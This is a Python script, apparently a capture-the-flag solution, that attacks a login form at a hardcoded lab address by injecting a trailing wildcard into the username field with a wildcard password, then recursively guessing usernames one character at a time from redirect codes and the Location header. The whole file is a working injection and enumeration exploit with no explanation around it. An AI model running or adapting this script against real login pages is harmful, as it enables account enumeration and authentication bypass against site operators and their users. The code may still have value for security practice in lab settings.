#!/bin/python3

import requests

matchCodes = [200,302]
filterLocation = ['ailed']
# I removed & and * because they would causing infinite recursion
alphabet = [c for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^()_+}{"]
maxLength = 40

headers = {
    'Host': '68.183.41.74:31495',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '21',
    'Origin': 'http://68.183.41.74:31495',
    'Connection': 'close',
    'Referer': 'http://68.183.41.74:31495/login',
    'Upgrade-Insecure-Requests': '1',
}

longstrings = []

def longestChildren(s):
    data = f'username={s}*&password=*'
    response = requests.post('http://68.183.41.74:31495/login', headers=headers, data=data, allow_redirects=False)
    # If this POST was unsuccessful, then this is not a valid substring.
    if (len(s) >= maxLength or response.status_code not in matchCodes):
        return
    # If the response contains any of the filter text, reject it
    for badStr in filterLocation:
        if response.headers['Location'].find(badStr) >= 0:
            return
    print(f"Found: {s}")
    if s[:-1] in longstrings:
        longstrings.remove(s[:-1])
    longstrings.append(s)
    for c in alphabet:
        longestChildren(s+c)

print('----------------------------------')

longestChildren('')
print("Completed. Matching substrings: ")
for s in longstrings:
    print(s)
    
    
